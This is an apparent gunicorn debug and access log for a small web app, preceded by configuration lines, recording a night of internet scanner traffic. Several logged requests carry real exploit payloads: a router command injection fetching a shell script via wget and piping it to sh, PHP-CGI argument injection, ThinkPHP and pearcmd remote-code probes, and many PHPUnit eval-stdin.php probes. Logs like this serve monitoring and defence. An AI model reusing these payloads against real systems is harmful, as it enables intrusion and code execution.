+  strip_header_spaces: False
+  permit_unconventional_http_method: False
+  permit_unconventional_http_version: False
+  casefold_http_method: False
+  forwarder_headers: ['SCRIPT_NAME', 'PATH_INFO']
+  header_map: drop
+  asgi_loop: auto
+  asgi_lifespan: auto
+  asgi_disconnect_grace_period: 3
+  root_path: 
+  dirty_apps: []
+  dirty_workers: 0
+  dirty_timeout: 300
+  dirty_threads: 1
+  dirty_graceful_timeout: 30
+  on_dirty_starting: <function OnDirtyStarting.on_dirty_starting at 0x773bb4ba4a90>
+  dirty_post_fork: <function DirtyPostFork.dirty_post_fork at 0x773bb4ba4bf0>
+  dirty_worker_init: <function DirtyWorkerInit.dirty_worker_init at 0x773bb4ba4d50>
+  dirty_worker_exit: <function DirtyWorkerExit.dirty_worker_exit at 0x773bb4ba4eb0>
+  control_socket: gunicorn.ctl
+  control_socket_mode: 384
+  control_socket_disable: False
+[2026-03-03 21:36:25 +0000] [47505] [INFO] Starting gunicorn 25.1.0
+[2026-03-03 21:36:25 +0000] [47505] [DEBUG] Arbiter booted
+[2026-03-03 21:36:25 +0000] [47505] [INFO] Listening at: unix:/run/agenda.socket (47505)
+[2026-03-03 21:36:25 +0000] [47505] [INFO] Using worker: sync
+[2026-03-03 21:36:25 +0000] [47509] [INFO] Booting worker with pid: 47509
+[2026-03-03 21:36:25 +0000] [47505] [INFO] Control socket listening at /home/windows/agendaapp/gunicorn.ctl
+[2026-03-03 21:36:25 +0000] [47510] [INFO] Booting worker with pid: 47510
+[2026-03-03 21:36:25 +0000] [47511] [INFO] Booting worker with pid: 47511
+[2026-03-03 21:36:25 +0000] [47512] [INFO] Booting worker with pid: 47512
+[2026-03-03 21:36:25 +0000] [47513] [INFO] Booting worker with pid: 47513
+[2026-03-03 21:36:25 +0000] [47514] [INFO] Booting worker with pid: 47514
+[2026-03-03 21:36:25 +0000] [47505] [DEBUG] 6 workers
+[2026-03-03 18:37:26 -0300] [47514] [DEBUG] POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [03/Mar/2026:18:37:26 -0300] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[2026-03-03 18:43:37 -0300] [47512] [DEBUG] GET /
+ - - [03/Mar/2026:18:43:37 -0300] "GET / HTTP/1.1" 200 1020 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
+[2026-03-03 18:44:58 -0300] [47510] [DEBUG] GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [03/Mar/2026:18:44:58 -0300] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[2026-03-03 18:51:15 -0300] [47510] [DEBUG] GET /
+ - - [03/Mar/2026:18:51:15 -0300] "GET / HTTP/1.1" 200 1020 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+[2026-03-03 18:51:17 -0300] [47511] [DEBUG] GET /favicon.ico
+ - - [03/Mar/2026:18:51:17 -0300] "GET /favicon.ico HTTP/1.1" 404 179 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+[2026-03-03 18:51:48 -0300] [47509] [DEBUG] GET /login
+ - - [03/Mar/2026:18:51:48 -0300] "GET /login HTTP/1.1" 404 179 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+[2026-03-03 19:04:45 -0300] [47514] [DEBUG] GET /
+ - - [03/Mar/2026:19:04:45 -0300] "GET / HTTP/1.1" 200 1020 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
+[2026-03-03 19:06:40 -0300] [47509] [DEBUG] GET /solr/admin/info/system
+ - - [03/Mar/2026:19:06:40 -0300] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[2026-03-03 19:24:59 -0300] [47512] [DEBUG] GET /cgi-bin/luci/;stok=/locale
+ - - [03/Mar/2026:19:24:59 -0300] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh) HTTP/1.1" 404 0 "-" "-"
+[2026-03-03 19:24:59 -0300] [47512] [DEBUG] Ignoring EPIPE
+[2026-03-03 19:24:59 -0300] [47514] [DEBUG] GET /cgi-bin/luci/;stok=/locale
+ - - [03/Mar/2026:19:24:59 -0300] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh) HTTP/1.1" 404 0 "-" "-"
+[2026-03-03 19:24:59 -0300] [47514] [DEBUG] Ignoring EPIPE
+[2026-03-03 19:28:00 -0300] [47512] [DEBUG] GET /
+ - - [03/Mar/2026:19:28:00 -0300] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 1020 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[2026-03-03 19:32:11 -0300] [47510] [DEBUG] GET /
+ - - [03/Mar/2026:19:32:11 -0300] "GET / HTTP/1.1" 200 1020 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
+[2026-03-03 19:38:41 -0300] [47513] [DEBUG] GET /console/
+ - - [03/Mar/2026:19:38:41 -0300] "GET /console/ HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[2026-03-03 19:50:23 -0300] [47514] [DEBUG] GET /
+ - - [03/Mar/2026:19:50:23 -0300] "GET / HTTP/1.1" 200 1020 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36 BitSightBot/1.0"
+[2026-03-03 19:54:08 -0300] [47512] [DEBUG] GET /_ignition/execute-solution
+ - - [03/Mar/2026:19:54:08 -0300] "GET /_ignition/execute-solution HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[2026-03-03 20:07:24 -0300] [47513] [DEBUG] GET /
+ - - [03/Mar/2026:20:07:24 -0300] "GET / HTTP/1.1" 200 1020 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[2026-03-03 20:15:52 -0300] [47511] [DEBUG] GET /
+ - - [03/Mar/2026:20:15:52 -0300] "GET / HTTP/1.1" 200 1020 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[2026-03-03 20:47:00 -0300] [47509] [DEBUG] GET /actuator/gateway/routes
+ - - [03/Mar/2026:20:47:00 -0300] "GET /actuator/gateway/routes HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[2026-03-03 20:57:14 -0300] [47514] [DEBUG] GET /geoserver
+ - - [03/Mar/2026:20:57:14 -0300] "GET /geoserver HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[2026-03-03 21:01:03 -0300] [47512] [DEBUG] GET /
+ - - [03/Mar/2026:21:01:04 -0300] "GET / HTTP/1.1" 200 1020 "-" "Mozilla/5.0"
+[2026-03-03 21:14:32 -0300] [47514] [DEBUG] GET /hudson
+ - - [03/Mar/2026:21:14:32 -0300] "GET /hudson HTTP/1.1" 404 179 "-" "Mozilla/5.0 zgrab/0.x"
+[2026-03-03 22:16:37 -0300] [47514] [DEBUG] GET /SDK/webLanguage
+ - - [03/Mar/2026:22:16:37 -0300] "GET /SDK/webLanguage HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+[2026-03-03 22:24:53 -0300] [47514] [DEBUG] POST /
+ - - [03/Mar/2026:22:24:53 -0300] "POST / HTTP/1.1" 403 1421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[2026-03-03 22:36:51 -0300] [47510] [DEBUG] POST /
+ - - [03/Mar/2026:22:36:51 -0300] "POST / HTTP/1.1" 403 1421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+[2026-03-03 22:59:15 -0300] [47512] [DEBUG] POST /
+ - - [03/Mar/2026:22:59:15 -0300] "POST / HTTP/1.1" 403 1421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+[2026-03-03 23:03:52 -0300] [47512] [DEBUG] GET /developmentserver/metadatauploader
+ - - [03/Mar/2026:23:03:52 -0300] "GET /developmentserver/metadatauploader HTTP/1.1" 404 179 "-" "Mozilla/5.0 zgrab/0.x"
+[2026-03-03 23:08:00 -0300] [47510] [DEBUG] GET /
+ - - [03/Mar/2026:23:08:00 -0300] "GET / HTTP/1.1" 200 1020 "-" "python-requests/2.32.5"
+[2026-03-04 00:49:04 -0300] [47511] [DEBUG] GET /
+ - - [04/Mar/2026:00:49:05 -0300] "GET / HTTP/1.1" 200 1020 "-" "-"
+[2026-03-04 01:18:04 -0300] [47514] [DEBUG] POST /
+ - - [04/Mar/2026:01:18:04 -0300] "POST / HTTP/1.1" 403 1421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+[2026-03-04 01:32:38 -0300] [47509] [DEBUG] GET /
+ - - [04/Mar/2026:01:32:38 -0300] "GET / HTTP/1.1" 200 1020 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+[2026-03-04 01:32:38 -0300] [47514] [DEBUG] GET /favicon.ico
+ - - [04/Mar/2026:01:32:38 -0300] "GET /favicon.ico HTTP/1.1" 404 179 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+[2026-03-04 01:32:43 -0300] [47514] [DEBUG] GET /wiki
+ - - [04/Mar/2026:01:32:43 -0300] "GET /wiki HTTP/1.1" 404 179 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+[2026-03-04 01:56:36 -0300] [47514] [DEBUG] GET /
+ - - [04/Mar/2026:01:56:36 -0300] "GET / HTTP/1.1" 200 1020 "-" "Go-http-client/1.1"
+[2026-03-04 02:03:15 -0300] [47509] [DEBUG] GET /
+ - - [04/Mar/2026:02:03:15 -0300] "GET / HTTP/1.1" 200 1020 "-" "-"
+[2026-03-04 02:17:15 -0300] [47510] [DEBUG] GET /
+ - - [04/Mar/2026:02:17:15 -0300] "GET / HTTP/1.1" 200 1020 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
+[2026-03-04 02:29:43 -0300] [47511] [DEBUG] POST /
+ - - [04/Mar/2026:02:29:43 -0300] "POST / HTTP/1.1" 403 1421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+[2026-03-04 03:18:40 -0300] [47512] [DEBUG] GET /
+ - - [04/Mar/2026:03:18:40 -0300] "GET / HTTP/1.1" 200 1020 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
+[2026-03-04 03:19:21 -0300] [47513] [DEBUG] GET /
+ - - [04/Mar/2026:03:19:21 -0300] "GET / HTTP/1.1" 200 1020 "-" "-"
+[2026-03-04 03:30:23 -0300] [47510] [DEBUG] POST /
+ - - [04/Mar/2026:03:30:23 -0300] "POST / HTTP/1.1" 403 1421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+[2026-03-04 04:40:23 -0300] [47514] [DEBUG] GET /
+ - - [04/Mar/2026:04:40:23 -0300] "GET / HTTP/1.1" 200 1020 "-" "Mozilla/5.0"
+[2026-03-04 04:47:09 -0300] [47514] [DEBUG] GET /
+ - - [04/Mar/2026:04:47:09 -0300] "GET / HTTP/1.1" 200 1020 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36"
+[2026-03-04 04:49:07 -0300] [47509] [DEBUG] GET /
+ - - [04/Mar/2026:04:49:07 -0300] "GET / HTTP/1.1" 200 1020 "-" "Linux Gnu (cow)"
+[2026-03-04 05:31:25 -0300] [47512] [DEBUG] POST /
+ - - [04/Mar/2026:05:31:25 -0300] "POST / HTTP/1.1" 403 1421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+[2026-03-04 06:18:12 -0300] [47513] [DEBUG] GET /
+ - - [04/Mar/2026:06:18:12 -0300] "GET / HTTP/1.1" 200 1020 "-" "Mozilla/5.0 (X11; Linux x86_64) Gecko/20060609 Firefox/123.0esr"
+[2026-03-04 06:18:59 -0300] [47509] [DEBUG] GET /webui/
+ - - [04/Mar/2026:06:18:59 -0300] "GET /webui/ HTTP/1.1" 404 179 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0"
+[2026-03-04 06:20:24 -0300] [47514] [DEBUG] GET /favicon.ico
+ - - [04/Mar/2026:06:20:24 -0300] "GET /favicon.ico HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 YaBrowser/24.1.0.0 Safari/537.36"
+[2026-03-04 06:21:15 -0300] [47509] [DEBUG] GET /geoserver/web/
+ - - [04/Mar/2026:06:21:15 -0300] "GET /geoserver/web/ HTTP/1.1" 404 179 "-" "Mozilla/5.0 (X11; Linux x86_64) Gecko/20060609 Firefox/123.0esr"
+[2026-03-04 06:28:10 -0300] [47512] [DEBUG] POST /
+ - - [04/Mar/2026:06:28:10 -0300] "POST / HTTP/1.1" 403 1421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
+[2026-03-04 06:34:28 -0300] [47511] [DEBUG] POST /hello.world
+ - - [04/Mar/2026:06:34:28 -0300] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:28 -0300] [47512] [DEBUG] POST /
+ - - [04/Mar/2026:06:34:28 -0300] "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 403 1421 "-" "libredtail-http"
+[2026-03-04 06:34:29 -0300] [47511] [DEBUG] GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:29 -0300] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:29 -0300] [47512] [DEBUG] GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:29 -0300] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:29 -0300] [47510] [DEBUG] GET /vendor/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:29 -0300] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:30 -0300] [47512] [DEBUG] GET /vendor/phpunit/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:30 -0300] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:31 -0300] [47513] [DEBUG] GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php
+ - - [04/Mar/2026:06:34:31 -0300] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:31 -0300] [47514] [DEBUG] GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:31 -0300] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:31 -0300] [47513] [DEBUG] GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:31 -0300] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:32 -0300] [47514] [DEBUG] GET /phpunit/phpunit/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:32 -0300] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:32 -0300] [47510] [DEBUG] GET /phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:32 -0300] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:33 -0300] [47510] [DEBUG] GET /phpunit/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:33 -0300] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:33 -0300] [47510] [DEBUG] GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:33 -0300] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:33 -0300] [47513] [DEBUG] GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:33 -0300] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:34 -0300] [47511] [DEBUG] GET /lib/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:34 -0300] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:34 -0300] [47512] [DEBUG] GET /lib/phpunit/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:34 -0300] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:35 -0300] [47511] [DEBUG] GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:35 -0300] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:35 -0300] [47511] [DEBUG] GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:35 -0300] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:36 -0300] [47514] [DEBUG] GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:36 -0300] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:36 -0300] [47510] [DEBUG] GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:36 -0300] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:37 -0300] [47512] [DEBUG] GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:37 -0300] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:37 -0300] [47511] [DEBUG] GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:37 -0300] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:37 -0300] [47511] [DEBUG] GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:37 -0300] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:38 -0300] [47509] [DEBUG] GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:38 -0300] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:38 -0300] [47511] [DEBUG] GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:38 -0300] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:39 -0300] [47514] [DEBUG] GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:39 -0300] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:39 -0300] [47514] [DEBUG] GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:39 -0300] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:40 -0300] [47513] [DEBUG] GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:40 -0300] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:40 -0300] [47513] [DEBUG] GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:40 -0300] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:41 -0300] [47510] [DEBUG] GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:41 -0300] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:41 -0300] [47514] [DEBUG] GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:41 -0300] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:41 -0300] [47514] [DEBUG] GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:41 -0300] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 0 "-" "libredtail-http"
+[2026-03-04 06:34:42 -0300] [47514] [DEBUG] GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:42 -0300] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:42 -0300] [47511] [DEBUG] GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:42 -0300] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:43 -0300] [47512] [DEBUG] GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:43 -0300] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:43 -0300] [47514] [DEBUG] GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:43 -0300] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:43 -0300] [47509] [DEBUG] GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:43 -0300] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:44 -0300] [47512] [DEBUG] GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:44 -0300] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:44 -0300] [47513] [DEBUG] GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ - - [04/Mar/2026:06:34:44 -0300] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:45 -0300] [47514] [DEBUG] GET /index.php
+ - - [04/Mar/2026:06:34:45 -0300] "GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:45 -0300] [47510] [DEBUG] GET /public/index.php
+ - - [04/Mar/2026:06:34:45 -0300] "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:45 -0300] [47512] [DEBUG] GET /index.php
+ - - [04/Mar/2026:06:34:45 -0300] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:46 -0300] [47509] [DEBUG] GET /index.php
+ - - [04/Mar/2026:06:34:46 -0300] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:34:46 -0300] [47512] [DEBUG] GET /containers/json
+ - - [04/Mar/2026:06:34:46 -0300] "GET /containers/json HTTP/1.1" 404 179 "-" "libredtail-http"
+[2026-03-04 06:49:23 -0300] [47512] [DEBUG] GET /
+ - - [04/Mar/2026:06:49:23 -0300] "GET / HTTP/1.1" 200 1020 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)"
+[2026-03-04 06:50:02 -0300] [47509] [DEBUG] GET /
+ - - [04/Mar/2026:06:50:02 -0300] "GET / HTTP/1.1" 200 1020 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)"
+[2026-03-04 06:51:22 -0300] [47514] [DEBUG] GET /
+ - - [04/Mar/2026:06:51:22 -0300] "GET / HTTP/1.1" 200 1020 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)"
+[2026-03-04 06:52:01 -0300] [47510] [DEBUG] GET /
+ - - [04/Mar/2026:06:52:01 -0300] "GET / HTTP/1.1" 200 1020 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)"
+[2026-03-04 06:52:36 -0300] [47511] [DEBUG] GET /
